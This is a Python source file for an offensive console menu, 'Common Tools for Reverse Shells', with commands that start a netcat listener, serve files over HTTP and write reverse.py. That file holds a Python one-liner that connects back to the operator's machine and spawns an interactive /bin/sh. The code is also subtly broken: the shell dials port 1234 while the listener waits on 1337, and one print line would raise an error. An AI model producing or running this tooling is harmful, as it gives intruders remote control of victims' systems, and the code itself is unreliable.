from cmd2 import Cmd
from colorama import Fore, Back, Style
import subprocess
import http.server
import socketserver
import socket


class Shells(Cmd):
    intro = "Common Tools for Reverse Shells\n"
    prompt = "[" + Fore.YELLOW + "shells" + Style.RESET_ALL + "] >>> "

    def do_listen(self, line):
        PORT = line
        subprocess.call('nc -lvnp {}'.format(PORT))

    def do_pythonws(self, line):
        "Start a python HTTP web server by running 'pythonws PORT'"
        PORT = int(line)

        Handler = http.server.SimpleHTTPRequestHandler

        with socketserver.TCPServer(("", PORT), Handler) as httpd:
            print("Serving at port: " + str(PORT))
            httpd.serve_forever()

    def do_reverse(self, line):
        "Generates a reverse shell script and listens on port 1337"

        userIP = socket.gethostbyname(socket.gethostname())

        #this is the reverse script that gets written int othe file
        output = """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""""+ userIP + """\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""
        
        file = open("reverse.py", "w+")
        file.write(output)
        file.close()

        print("Script Generated !! \nListening on port 1337")

        #Step 2: run listen
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        serverAddrr = (userIP, 1337)

        listener.bind(serverAddrr)

        listener.listen(1)

        while True:
            print("Waiting for connection")
            connection, client_address = listener.accept()
                # python -c 'import pty;
                # pty.spawn("/bin/bash")'
            try:
                print("from" + client_address)

            finally:
                connection.close()


    # def do_exit(self, line):
    #     "Exits back to main menu"
    #     return True

    def do_back(self, line):
        "Returns back to previous prompt"
        return True

    # def do_EOF(self, line):
    #     "Exits the application"
    #     return True

    def postloop(self):
        "Exiting message"
        print("Exiting back to main menu...\n")

    def emptyline(self):
        "Does nothing on emptyline"
        pass


def shellExec():
    import sys
    sys.exit(Shells().cmdloop())